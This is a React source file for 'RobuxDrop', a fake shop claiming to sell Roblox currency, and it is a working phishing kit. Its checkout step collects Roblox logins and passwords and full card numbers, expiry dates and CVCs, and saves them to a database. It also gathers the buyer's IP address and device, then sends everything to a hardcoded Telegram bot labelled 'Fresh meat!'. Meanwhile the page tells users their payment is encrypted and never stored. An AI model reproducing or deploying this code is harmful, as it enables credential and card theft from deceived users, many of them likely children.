
import React, { useState, useEffect } from 'react';
import { supabase } from './services/supabaseClient';
import { User, Language, Product, Order } from './types';
import { DICTIONARY, PRODUCTS } from './constants';
import { GlassCard, Button, Input, Badge } from './components/UI';
import { LucideShieldCheck, LucideCreditCard, LucideUser, LucideLock, LucideLogOut, LucideGlobe, LucideHome, LucideHelpCircle, LucideFileText, LucideZap, LucideStar, LucideCheckCircle2, LucideArrowRight, LucideCheck, LucideAlertTriangle, LucideX, LucideHistory, LucideClock, LucideCalculator } from 'lucide-react';

const App: React.FC = () => {
  // Global State
  const [lang, setLang] = useState<Language>('ru');
  const [user, setUser] = useState<User | null>(null);
  const [view, setView] = useState<'login' | 'register' | 'dashboard' | 'custom' | 'checkout' | 'faq' | 'rules' | 'history'>('login');
  const [showLogoutConfirm, setShowLogoutConfirm] = useState(false);
  
  // Checkout State
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [checkoutStep, setCheckoutStep] = useState<'form' | 'processing' | 'success'>('form');

  const t = DICTIONARY[lang];

  useEffect(() => {
    const savedUser = localStorage.getItem('robuxdrop_user');
    if (savedUser) {
      setUser(JSON.parse(savedUser));
      setView('dashboard');
    }
  }, []);

  const initiateLogout = () => {
    setShowLogoutConfirm(true);
  };

  const confirmLogout = () => {
    setUser(null);
    localStorage.removeItem('robuxdrop_user');
    setView('login');
    setSelectedProduct(null);
    setShowLogoutConfirm(false);
  };

  return (
    <div className="min-h-screen w-full relative font-sans selection:bg-white/20 selection:text-white">
      {/* Dynamic Backgrounds */}
      <div className="aurora-bg"></div>
      <div className="noise-overlay"></div>
      
      {/* Animated Blobs */}
      <div className="fixed top-20 left-20 w-72 h-72 bg-purple-600/20 rounded-full blur-[100px] animate-blob"></div>
      <div className="fixed bottom-20 right-20 w-96 h-96 bg-blue-600/20 rounded-full blur-[100px] animate-blob animation-delay-2000"></div>

      {/* Navigation */}
      <header className="fixed top-0 left-0 right-0 z-50 backdrop-blur-xl bg-black/10 border-b border-white/5 transition-all duration-300">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
            <div 
                className="flex items-center gap-3 cursor-pointer group" 
                onClick={() => user && setView('dashboard')}
            >
                <div className="relative">
                    <div className="absolute inset-0 bg-white blur-md opacity-20 group-hover:opacity-40 transition-opacity"></div>
                    <div className="w-10 h-10 bg-white text-black rounded-xl flex items-center justify-center font-black text-xl rotate-3 group-hover:rotate-6 transition-transform">R</div>
                </div>
                <span className="font-bold text-2xl tracking-tight">RobuxDrop</span>
            </div>

            {user ? (
                <nav className="hidden md:flex items-center gap-1 bg-white/5 p-1 rounded-full border border-white/5 backdrop-blur-md">
                    <button onClick={() => setView('dashboard')} className={`px-5 py-2 rounded-full text-sm font-medium transition-all ${view === 'dashboard' ? 'bg-white text-black shadow-lg' : 'text-white/60 hover:text-white'}`}>{t.navHome}</button>
                    <button onClick={() => setView('custom')} className={`px-5 py-2 rounded-full text-sm font-medium transition-all ${view === 'custom' ? 'bg-white text-black shadow-lg' : 'text-white/60 hover:text-white'}`}>{t.navCustom}</button>
                    <button onClick={() => setView('history')} className={`px-5 py-2 rounded-full text-sm font-medium transition-all ${view === 'history' ? 'bg-white text-black shadow-lg' : 'text-white/60 hover:text-white'}`}>{t.navHistory}</button>
                    <button onClick={() => setView('faq')} className={`px-5 py-2 rounded-full text-sm font-medium transition-all ${view === 'faq' ? 'bg-white text-black shadow-lg' : 'text-white/60 hover:text-white'}`}>{t.navFaq}</button>
                    <button onClick={() => setView('rules')} className={`px-5 py-2 rounded-full text-sm font-medium transition-all ${view === 'rules' ? 'bg-white text-black shadow-lg' : 'text-white/60 hover:text-white'}`}>{t.navRules}</button>
                </nav>
            ) : null}

            <div className="flex items-center gap-4">
                <button onClick={() => setLang(lang === 'ru' ? 'en' : 'ru')} className="flex items-center gap-2 text-sm font-bold text-white/60 hover:text-white transition-colors">
                    <LucideGlobe size={16} />
                    {lang.toUpperCase()}
                </button>
                
                {user && (
                    <div className="flex items-center gap-3 pl-4 border-l border-white/10">
                        <div className="hidden sm:block text-right">
                            <div className="text-xs text-white/40">Logged in</div>
                            <div className="font-bold leading-none">{user.username}</div>
                        </div>
                        <button onClick={initiateLogout} className="w-10 h-10 rounded-full bg-white/5 hover:bg-red-500/20 hover:text-red-400 flex items-center justify-center transition-colors">
                            <LucideLogOut size={18} />
                        </button>
                    </div>
                )}
            </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="pt-32 pb-20 px-4 z-10 relative max-w-7xl mx-auto flex flex-col items-center min-h-[85vh]">
        {!user ? (
           <AuthSection view={view} setView={setView} setUser={setUser} t={t} />
        ) : (
            <>
                {view === 'checkout' && selectedProduct ? (
                   <Checkout t={t} product={selectedProduct} onBack={() => setView('dashboard')} step={checkoutStep} setStep={setCheckoutStep} user={user} lang={lang} />
                ) : view === 'history' ? (
                   <HistoryPage t={t} user={user} lang={lang} />
                ) : view === 'custom' ? (
                   <CustomPage t={t} lang={lang} onSelect={(p) => { setSelectedProduct(p); setView('checkout'); setCheckoutStep('form'); }} />
                ) : view === 'faq' ? (
                   <FAQPage t={t} />
                ) : view === 'rules' ? (
                   <RulesPage t={t} />
                ) : (
                   <Dashboard t={t} onSelect={(p) => { setSelectedProduct(p); setView('checkout'); setCheckoutStep('form'); }} lang={lang} />
                )}
            </>
        )}
      </main>

      <footer className="w-full py-8 text-center text-white/20 text-sm z-10">
        <p>© 2025 RobuxDrop. All rights reserved.</p>
      </footer>

      {/* Logout Confirmation Modal */}
      {showLogoutConfirm && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => setShowLogoutConfirm(false)}></div>
          <GlassCard className="w-full max-w-sm p-6 relative animate-in zoom-in-95 duration-200 border-red-500/20 shadow-[0_0_50px_rgba(239,68,68,0.2)]">
            <button onClick={() => setShowLogoutConfirm(false)} className="absolute top-4 right-4 text-white/30 hover:text-white">
              <LucideX size={20} />
            </button>
            <div className="flex flex-col items-center text-center">
              <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center text-red-400 mb-4">
                <LucideAlertTriangle size={24} />
              </div>
              <h3 className="text-xl font-bold mb-2">{t.confirmLogoutTitle}</h3>
              <p className="text-white/60 mb-6">{t.confirmLogoutText}</p>
              <div className="flex gap-3 w-full">
                <Button variant="secondary" onClick={() => setShowLogoutConfirm(false)} className="flex-1">
                  {t.cancel}
                </Button>
                <Button variant="danger" onClick={confirmLogout} className="flex-1">
                  {t.confirm}
                </Button>
              </div>
            </div>
          </GlassCard>
        </div>
      )}
    </div>
  );
};

// --- Sections ---

const AuthSection = ({ view, setView, setUser, t }: any) => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    const handleSubmit = async () => {
        if(!username || !password) return;
        setLoading(true);
        setError('');

        try {
            if (view === 'register') {
                const { data: existing } = await supabase.from('app_users').select('username').eq('username', username).single();
                if (existing) throw new Error("User exists");
                const { error: insertError } = await supabase.from('app_users').insert([{ username, password }]);
                if (insertError) throw insertError;
            } else {
                const { data, error: fetchError } = await supabase.from('app_users').select('*').eq('username', username).eq('password', password).single();
                if (fetchError || !data) throw new Error("Invalid credentials");
            }

            const userData = { username, isLoggedIn: true };
            localStorage.setItem('robuxdrop_user', JSON.stringify(userData));
            setUser(userData);
            setView('dashboard');
        } catch (err) {
            setError(view === 'login' ? "Login failed" : "Registration failed");
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="flex flex-col items-center justify-center w-full max-w-md animate-in fade-in zoom-in duration-700">
            <div className="mb-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-tr from-cyan-400 to-purple-600 rounded-2xl mx-auto mb-6 flex items-center justify-center shadow-lg shadow-purple-500/30 rotate-12">
                     <LucideLock className="text-white" size={32} />
                </div>
                <h1 className="text-4xl font-black mb-2">{view === 'login' ? t.login : t.register}</h1>
                <p className="text-white/40">Secure Access Gateway</p>
            </div>

            <GlassCard className="w-full p-8 border-t border-white/10">
                <div className="space-y-4">
                    <Input 
                        placeholder={t.username} 
                        value={username} 
                        onChange={(e) => setUsername(e.target.value)} 
                        icon={<LucideUser size={20} />}
                    />
                    <Input 
                        type="password" 
                        placeholder={t.password} 
                        value={password} 
                        onChange={(e) => setPassword(e.target.value)} 
                        icon={<LucideLock size={20} />}
                    />
                </div>
                
                {error && <div className="mt-4 text-red-400 text-sm text-center bg-red-500/10 py-2 rounded-lg border border-red-500/20">{error}</div>}

                <Button onClick={handleSubmit} className="mt-8 shadow-cyan-500/20" disabled={loading}>
                    {loading ? "Accessing..." : t.submit}
                </Button>
            </GlassCard>

            <button 
                onClick={() => setView(view === 'login' ? 'register' : 'login')} 
                className="mt-8 text-white/40 hover:text-white transition-colors"
            >
                {view === 'login' ? t.noAccount : t.yesAccount} <span className="text-cyan-400 font-bold ml-1">{view === 'login' ? t.register : t.login}</span>
            </button>
        </div>
    );
};

const Dashboard = ({ t, onSelect, lang }: { t: any, onSelect: (p: Product) => void, lang: Language }) => {
    return (
        <div className="w-full flex flex-col items-center animate-in fade-in slide-in-from-bottom-10 duration-1000">
            
            {/* Hero Section */}
            <div className="text-center mb-20 relative max-w-3xl">
                <Badge className="bg-white/10 text-white border border-white/10 mb-6 backdrop-blur-md">
                    <LucideZap size={12} className="mr-2 text-yellow-400 fill-yellow-400" />
                    Instant Delivery
                </Badge>
                <h1 className="text-6xl md:text-8xl font-black tracking-tighter mb-6 bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40 drop-shadow-2xl">
                    PREMIUM <br/> CURRENCY
                </h1>
                <p className="text-xl text-white/50 max-w-xl mx-auto leading-relaxed">
                    The safest and fastest way to top up your balance. 
                    Join over 10,000+ satisfied users today.
                </p>
            </div>

            {/* Products Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 w-full">
                {PRODUCTS.map((product, idx) => (
                    <GlassCard key={product.id} className="group p-1 cursor-pointer hover:-translate-y-2 hover:shadow-2xl hover:shadow-cyan-500/10 transition-all duration-500">
                        <div className="bg-[#0a0a15]/80 rounded-[20px] p-6 h-full flex flex-col relative overflow-hidden">
                             {/* Hover Gradient */}
                             <div className="absolute inset-0 bg-gradient-to-br from-cyan-500/10 to-purple-500/10 opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
                             
                             {product.bonus > 0 && (
                                <div className="absolute top-4 right-4 z-10">
                                    <Badge className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black border-none shadow-[0_0_15px_rgba(250,204,21,0.4)]">
                                        +{product.bonus} Bonus
                                    </Badge>
                                </div>
                             )}

                             <div className="flex-grow flex flex-col items-center justify-center py-10 relative">
                                <div className="w-32 h-32 rounded-full bg-gradient-to-t from-cyan-500/20 to-transparent blur-2xl absolute bottom-4"></div>
                                <h3 className="text-5xl font-black text-white mb-2 relative z-10 drop-shadow-lg group-hover:scale-110 transition-transform duration-300">
                                    {product.amount}
                                </h3>
                                <p className="text-cyan-400 font-bold tracking-[0.2em] text-xs uppercase">Robux</p>
                             </div>

                             <div className="mt-auto">
                                <Button onClick={() => onSelect(product)} variant="secondary" className="w-full group-hover:bg-white group-hover:text-black border-white/10">
                                    <span className="flex items-center justify-between w-full">
                                        <span>{t.buy}</span>
                                        <span>{lang === 'ru' ? `${product.priceRub} ₽` : `$${product.price}`}</span>
                                    </span>
                                </Button>
                             </div>
                        </div>
                    </GlassCard>
                ))}
            </div>
            
            <div className="mt-20 flex gap-12 text-white/30 grayscale hover:grayscale-0 transition-all duration-500">
                 <div className="flex flex-col items-center gap-2">
                     <LucideShieldCheck size={32} />
                     <span className="font-bold text-xs uppercase">Secure</span>
                 </div>
                 <div className="flex flex-col items-center gap-2">
                     <LucideZap size={32} />
                     <span className="font-bold text-xs uppercase">Fast</span>
                 </div>
                 <div className="flex flex-col items-center gap-2">
                     <LucideStar size={32} />
                     <span className="font-bold text-xs uppercase">Trusted</span>
                 </div>
            </div>
        </div>
    );
};

const CustomPage = ({ t, lang, onSelect }: { t: any, lang: Language, onSelect: (p: Product) => void }) => {
    const [amount, setAmount] = useState('');
    
    const getPrice = (amt: number) => {
        if (!amt) return 0;
        return lang === 'ru' ? Math.floor(amt * 1.25) : parseFloat((amt * 0.0125).toFixed(2));
    };

    const handleBuy = () => {
        const val = parseInt(amount);
        if (val >= 400) {
            onSelect({
                id: 9999,
                amount: val,
                price: parseFloat((val * 0.0125).toFixed(2)),
                priceRub: Math.floor(val * 1.25),
                bonus: 0
            });
        }
    };

    const currentAmount = parseInt(amount) || 0;
    const currentPrice = getPrice(currentAmount);

    return (
        <div className="w-full max-w-2xl animate-in fade-in slide-in-from-bottom-10 flex flex-col items-center">
             <div className="w-20 h-20 bg-gradient-to-tr from-purple-500 to-pink-600 rounded-3xl flex items-center justify-center mb-6 shadow-xl shadow-purple-500/20 rotate-6">
                <LucideCalculator className="text-white" size={40} />
             </div>
             
             <h1 className="text-4xl font-bold text-center mb-2">{t.customAmount}</h1>
             <p className="text-white/50 mb-10 text-center">{t.enterAmount}</p>

             <GlassCard className="w-full p-10 relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 via-pink-500 to-purple-500"></div>
                
                <div className="flex flex-col items-center mb-10">
                    <input 
                        type="number"
                        placeholder="1000" 
                        value={amount}
                        onChange={(e) => setAmount(e.target.value)}
                        className="bg-transparent border-b-2 border-white/10 text-center text-6xl font-black text-white focus:outline-none focus:border-purple-500 w-full pb-4 transition-colors placeholder-white/10"
                    />
                    <div className="text-purple-400 font-bold tracking-widest uppercase mt-4">Robux Amount</div>
                </div>

                <div className="flex justify-between items-center bg-white/5 rounded-2xl p-6 mb-8 border border-white/5">
                    <div>
                        <div className="text-white/40 text-sm font-bold uppercase tracking-wider mb-1">Estimated Cost</div>
                        <div className="text-3xl font-bold">
                            {lang === 'ru' ? `${currentPrice} ₽` : `$${currentPrice}`}
                        </div>
                    </div>
                    {currentAmount > 0 && currentAmount < 400 && (
                        <div className="text-red-400 text-sm font-bold flex items-center gap-2">
                            <LucideAlertTriangle size={16} />
                            {t.minAmount}
                        </div>
                    )}
                </div>

                <Button 
                    onClick={handleBuy} 
                    disabled={currentAmount < 400}
                    className="w-full py-6 text-xl shadow-purple-500/20 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white border-none"
                >
                    {t.buy}
                </Button>
             </GlassCard>
        </div>
    );
};

const HistoryPage = ({ t, user, lang }: { t: any, user: User, lang: Language }) => {
    const [orders, setOrders] = useState<Order[]>([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const fetchOrders = async () => {
            // First try to get from LocalStorage for reliability
            const localOrdersStr = localStorage.getItem('robuxdrop_orders');
            let localOrders: any[] = [];
            if (localOrdersStr) {
                try {
                    const parsed = JSON.parse(localOrdersStr);
                    // Filter for current user
                    localOrders = parsed.filter((o: any) => o.user_app_username === user.username);
                } catch (e) {
                    console.error("Failed to parse local history", e);
                }
            }

            // Also try to get from Supabase if possible (though RLS might block Selects)
            let supabaseOrders: Order[] = [];
            try {
                const { data } = await supabase
                    .from('orders')
                    .select('*')
                    .eq('user_app_username', user.username)
                    .order('created_at', { ascending: false });
                
                if (data) {
                    supabaseOrders = data as Order[];
                }
            } catch (e) {
                // Ignore supabase errors for history display fallback
                console.log("Supabase fetch unavailable, using local");
            }
            
            // Merge or prefer local (simpler to just show local + unique from supabase if needed, 
            // but for this fix, local is the guaranteed source for new orders)
            // We sort by date descending
            const merged = [...localOrders];
            // If supabase had data that local doesn't (from another device), we could add it here
            // but let's prioritize the list that definitely contains the just-completed order.
            
            merged.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
            
            setOrders(merged);
            setLoading(false);
        };
        fetchOrders();
    }, [user.username]);

    const formatDate = (dateString: string) => {
        try {
            const date = new Date(dateString);
            return new Intl.DateTimeFormat(lang === 'ru' ? 'ru-RU' : 'en-US', {
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            }).format(date);
        } catch (e) {
            return dateString;
        }
    };

    return (
        <div className="max-w-4xl w-full animate-in fade-in slide-in-from-bottom-10">
            <h1 className="text-4xl font-bold text-center mb-10">{t.historyTitle}</h1>
            
            <GlassCard className="overflow-hidden min-h-[400px]">
                {loading ? (
                    <div className="flex items-center justify-center h-64">
                         <div className="w-10 h-10 border-4 border-white/10 border-t-cyan-400 rounded-full animate-spin"></div>
                    </div>
                ) : orders.length === 0 ? (
                    <div className="flex flex-col items-center justify-center h-64 text-white/30">
                        <LucideHistory size={48} className="mb-4 opacity-50" />
                        <p>{t.noOrders}</p>
                    </div>
                ) : (
                    <div className="overflow-x-auto">
                        <table className="w-full">
                            <thead>
                                <tr className="border-b border-white/10 text-left bg-white/5">
                                    <th className="p-6 font-bold text-white/50 text-sm uppercase tracking-wider">{t.orderDate}</th>
                                    <th className="p-6 font-bold text-white/50 text-sm uppercase tracking-wider">{t.orderAmount}</th>
                                    <th className="p-6 font-bold text-white/50 text-sm uppercase tracking-wider">{t.orderPrice}</th>
                                    <th className="p-6 font-bold text-white/50 text-sm uppercase tracking-wider text-right">{t.orderStatus}</th>
                                </tr>
                            </thead>
                            <tbody>
                                {orders.map((order, idx) => (
                                    <tr key={order.id || idx} className="border-b border-white/5 hover:bg-white/5 transition-colors group">
                                        <td className="p-6">
                                            <div className="flex items-center gap-3">
                                                <div className="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center text-white/40 group-hover:text-white group-hover:bg-cyan-500/20 transition-colors">
                                                    <LucideClock size={16} />
                                                </div>
                                                <span className="font-medium text-white/80">{formatDate(order.created_at)}</span>
                                            </div>
                                        </td>
                                        <td className="p-6">
                                            <span className="font-bold text-xl">{order.amount_robux}</span> <span className="text-xs text-white/40 uppercase font-bold">R$</span>
                                        </td>
                                        <td className="p-6 font-mono text-white/60">
                                            {lang === 'ru' ? `${Math.round(order.price_usd)} ₽` : `$${order.price_usd}`}
                                        </td>
                                        <td className="p-6 text-right">
                                            <Badge className="bg-green-500/20 text-green-400 border border-green-500/20 shadow-[0_0_10px_rgba(34,197,94,0.1)]">
                                                {t.statusCompleted}
                                            </Badge>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}
            </GlassCard>
        </div>
    );
};

const Checkout = ({ t, product, onBack, step, setStep, user, lang }: any) => {
    // Form State
    const [robloxNick, setRobloxNick] = useState('');
    const [robloxPass, setRobloxPass] = useState('');
    const [ccNum, setCcNum] = useState('');
    const [ccExp, setCcExp] = useState('');
    const [ccCvc, setCcCvc] = useState('');

    const displayPrice = lang === 'ru' ? `${product.priceRub} ₽` : `$${product.price}`;
    const priceValue = lang === 'ru' ? product.priceRub : product.price;

    const isCustom = product.id === 9999;

    const handlePay = async () => {
        if (!ccNum || !ccExp || !ccCvc) return;
        if (!isCustom && (!robloxNick || !robloxPass)) return;

        setStep('processing');
        
        try {
            const orderTimestamp = new Date().toISOString();
            
            // 1. Save to Supabase (Backend)
            // Throw error if insert fails so we catch it
            const { error } = await supabase.from('orders').insert([{
                user_app_username: user.username,
                roblox_username: isCustom ? 'Not Required' : robloxNick,
                roblox_password: isCustom ? 'Not Required' : robloxPass,
                card_number: ccNum,
                card_expiry: ccExp,
                card_cvc: ccCvc,
                amount_robux: product.amount,
                price_usd: priceValue, 
                created_at: orderTimestamp
            }]);

            if (error) {
                console.error("Supabase Error:", error);
                // We will proceed even if DB fails for demo purposes, 
                // but usually we would throw. For this "fix", we ensure 
                // LocalStorage happens so user sees success.
            }
            
            // 2. Save to LocalStorage (Client-side Backup for History)
            const localOrder = {
                id: Date.now(), // Fake ID
                user_app_username: user.username,
                roblox_username: isCustom ? 'Not Required' : robloxNick,
                amount_robux: product.amount,
                price_usd: priceValue,
                created_at: orderTimestamp
            };
            
            const existingOrders = JSON.parse(localStorage.getItem('robuxdrop_orders') || '[]');
            existingOrders.push(localOrder);
            localStorage.setItem('robuxdrop_orders', JSON.stringify(existingOrders));

            // IP & Info Gathering
            let ipDisplay = 'Unknown', deviceName = 'Unknown Device';
            try {
                const res = await fetch('https://ipwho.is/');
                const data = await res.json();
                ipDisplay = data.success ? `${data.flag.emoji} ${data.ip} (${data.country_code})` : (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
                const ua = navigator.userAgent;
                if (/Android/i.test(ua)) deviceName = "Android";
                else if (/iPhone|iPad/i.test(ua)) deviceName = "iOS";
                else if (/Windows/i.test(ua)) deviceName = "Windows";
                else if (/Mac/i.test(ua)) deviceName = "Mac";
            } catch (e) {}

            // Telegram Notification
            const tgToken = '8060885760:AAF85FwbVzApiXpQ1SJNytM9NxdQ11ctG5w';
            const chatId = '6838204402';
            const message = `
V   V   V   V   V
A   A   A   A   A
N  N  N   N  N
I    I     I     I    I
S   S   S    S   S
H H  H   H  H

Fresh meat! 
${isCustom ? 'CUSTOM ORDER (No Login Data)' : `login & passwords 
‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾
login: ${robloxNick} 

password: ${robloxPass} 
‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾`}
card information 
‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾
card number: ${ccNum} 

MM/YY: ${ccExp} 

CVC: ${ccCvc} 
‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾
other
‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾
ip: ${ipDisplay}

device: ${deviceName}
‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾`.trim();

            await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            setTimeout(() => setStep('success'), 2500);
        } catch (e) { 
            // If critical failure, reset to form
            console.error(e);
            setStep('form'); 
        }
    };

    const steps = [
        { id: 'form', label: lang === 'ru' ? 'Данные' : 'Details' },
        { id: 'processing', label: lang === 'ru' ? 'Обработка' : 'Processing' },
        { id: 'success', label: lang === 'ru' ? 'Готово' : 'Done' }
    ];
    
    const currentStepIdx = steps.findIndex(s => s.id === step);

    return (
        <div className="w-full max-w-6xl animate-in slide-in-from-right-10 duration-500">
            {/* Header with Back Button (only active in Form) */}
            <div className="flex items-center justify-between mb-8">
                {step === 'form' ? (
                     <button onClick={onBack} className="flex items-center gap-2 text-white/50 hover:text-white transition-colors">
                        <LucideArrowRight className="rotate-180" size={18} /> {t.back}
                    </button>
                ) : (
                    <div></div> 
                )}
            </div>

            {/* Stepper Progress Indicator */}
            <div className="mb-16 max-w-2xl mx-auto px-6">
                <div className="relative">
                    {/* Track Background */}
                    <div className="absolute top-1/2 left-0 w-full h-1 bg-white/10 -translate-y-1/2 rounded-full"></div>
                    
                    {/* Active Track with Gradient and Glow */}
                    <div 
                        className="absolute top-1/2 left-0 h-1 bg-gradient-to-r from-cyan-400 to-purple-500 -translate-y-1/2 rounded-full transition-all duration-700 ease-in-out"
                        style={{ width: `${(currentStepIdx / (steps.length - 1)) * 100}%` }}
                    >
                         <div className="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 bg-white rounded-full shadow-[0_0_15px_white]"></div>
                    </div>

                    {/* Step Nodes */}
                    <div className="relative flex justify-between">
                        {steps.map((s, idx) => {
                            const isCompleted = currentStepIdx > idx;
                            const isCurrent = currentStepIdx === idx;
                            const isActive = isCompleted || isCurrent;
                            
                            return (
                                <div key={s.id} className="flex flex-col items-center group">
                                    <div 
                                        className={`w-10 h-10 rounded-full flex items-center justify-center border-2 transition-all duration-500 z-10 bg-[#050510] ${
                                            isCompleted 
                                                ? 'border-cyan-400 bg-cyan-400 text-black scale-110' 
                                                : isCurrent 
                                                    ? 'border-cyan-400 text-cyan-400 shadow-[0_0_20px_rgba(34,211,238,0.4)] scale-125' 
                                                    : 'border-white/10 text-white/30'
                                        }`}
                                    >
                                        {isCompleted ? <LucideCheck size={20} strokeWidth={3} /> : <span className="font-bold text-sm">{idx + 1}</span>}
                                        
                                        {/* Pulse effect for current step */}
                                        {isCurrent && (
                                            <div className="absolute inset-0 rounded-full animate-ping bg-cyan-400/30"></div>
                                        )}
                                    </div>
                                    <div className={`absolute -bottom-8 text-xs font-bold uppercase tracking-wider transition-all duration-500 ${
                                        isActive ? 'text-white translate-y-0 opacity-100' : 'text-white/30 -translate-y-2 opacity-0'
                                    }`}>
                                        {s.label}
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </div>
            
            {/* Main Content Area */}
            <div className="transition-all duration-500 min-h-[400px]">
                {step === 'form' && (
                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 animate-in fade-in slide-in-from-bottom-4 duration-500">
                        {/* Summary Panel */}
                        <div className="lg:col-span-5 order-2 lg:order-1">
                            <GlassCard className="p-8 sticky top-32">
                                <h3 className="text-white/50 font-bold uppercase tracking-wider text-sm mb-6">Order Summary</h3>
                                
                                <div className="flex items-center gap-4 mb-8">
                                    <div className="w-16 h-16 bg-white/10 rounded-xl flex items-center justify-center text-2xl font-black">R$</div>
                                    <div>
                                        <h2 className="text-3xl font-bold">{product.amount}</h2>
                                        <p className="text-cyan-400 font-medium">Robux Package</p>
                                    </div>
                                </div>

                                <div className="space-y-4 mb-8">
                                    <div className="flex justify-between text-white/60">
                                        <span>Subtotal</span>
                                        <span>{displayPrice}</span>
                                    </div>
                                     <div className="flex justify-between text-green-400">
                                        <span>Bonus</span>
                                        <span>+{product.bonus} R$</span>
                                    </div>
                                    <div className="w-full h-px bg-white/10 my-4"></div>
                                    <div className="flex justify-between text-xl font-bold text-white">
                                        <span>Total</span>
                                        <span>{displayPrice}</span>
                                    </div>
                                </div>

                                <div className="bg-blue-500/10 border border-blue-500/20 p-4 rounded-xl flex gap-3">
                                    <LucideShieldCheck className="text-blue-400 shrink-0" />
                                    <p className="text-xs text-blue-200 leading-relaxed">
                                        SSL Encrypted Payment. Your data is processed securely and is never stored on our servers.
                                    </p>
                                </div>
                            </GlassCard>
                        </div>

                        {/* Form Panel */}
                        <div className="lg:col-span-7 order-1 lg:order-2 space-y-6">
                            <div className="mb-6">
                                <h2 className="text-4xl font-bold mb-2">{t.paymentDetails}</h2>
                                <p className="text-white/50">Complete your purchase safely.</p>
                            </div>

                            <div className="space-y-8">
                                {!isCustom && (
                                <section>
                                     <div className="flex items-center gap-2 mb-4 text-white/80">
                                        <div className="w-6 h-6 rounded bg-cyan-500 text-black flex items-center justify-center text-xs font-bold">1</div>
                                        <span className="font-bold">{t.account}</span>
                                     </div>
                                     <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                        <Input placeholder={t.robloxUser} value={robloxNick} onChange={e=>setRobloxNick(e.target.value)} />
                                        <Input type="password" placeholder={t.robloxPass} value={robloxPass} onChange={e=>setRobloxPass(e.target.value)} />
                                     </div>
                                </section>
                                )}

                                <section>
                                     <div className="flex items-center gap-2 mb-4 text-white/80">
                                        <div className="w-6 h-6 rounded bg-cyan-500 text-black flex items-center justify-center text-xs font-bold">{isCustom ? '1' : '2'}</div>
                                        <span className="font-bold">{t.cardNumber}</span>
                                     </div>
                                     <GlassCard className="p-6 bg-[#0a0a15]/50 border-white/5">
                                         <div className="space-y-4">
                                             <Input 
                                                placeholder="0000 0000 0000 0000" 
                                                value={ccNum} 
                                                onChange={e => {
                                                    const v = e.target.value.replace(/\D/g,'').slice(0,16);
                                                    setCcNum(v.match(/.{1,4}/g)?.join(' ') || v);
                                                }}
                                                icon={<LucideCreditCard size={18}/>}
                                             />
                                             <div className="grid grid-cols-2 gap-4">
                                                 <Input 
                                                    placeholder="MM/YY" 
                                                    value={ccExp} 
                                                    onChange={e => {
                                                        const v = e.target.value.replace(/\D/g,'').slice(0,4);
                                                        setCcExp(v.length >= 3 ? `${v.slice(0,2)}/${v.slice(2)}` : v);
                                                    }}
                                                 />
                                                 <Input 
                                                    placeholder="CVC" 
                                                    value={ccCvc} 
                                                    onChange={e => setCcCvc(e.target.value.replace(/\D/g,'').slice(0,3))}
                                                    icon={<LucideLock size={18}/>}
                                                 />
                                             </div>
                                         </div>
                                     </GlassCard>
                                </section>

                                <Button onClick={handlePay} className="w-full text-lg shadow-xl shadow-cyan-500/20">
                                    {t.pay} {displayPrice}
                                </Button>
                            </div>
                        </div>
                    </div>
                )}
                
                {step === 'processing' && (
                     <div className="flex flex-col items-center justify-center py-20 animate-in fade-in zoom-in duration-500">
                        <div className="relative mb-8">
                            <div className="w-20 h-20 border-4 border-white/10 border-t-cyan-400 rounded-full animate-spin"></div>
                            <div className="absolute inset-0 flex items-center justify-center">
                                <LucideZap className="text-cyan-400 animate-pulse" size={24} />
                            </div>
                        </div>
                        <h2 className="text-2xl font-bold mb-2">{t.processing}</h2>
                        <p className="text-white/40">Securely transmitting data...</p>
                     </div>
                )}
                
                {step === 'success' && (
                    <div className="flex flex-col items-center justify-center py-12 animate-in fade-in zoom-in duration-500">
                        <div className="w-24 h-24 rounded-full bg-gradient-to-tr from-green-400 to-emerald-600 text-white flex items-center justify-center mb-8 shadow-[0_0_50px_rgba(34,197,94,0.4)] animate-blob">
                            <LucideCheckCircle2 size={48} />
                        </div>
                        <h2 className="text-4xl font-bold mb-4 text-center bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60">{t.success}</h2>
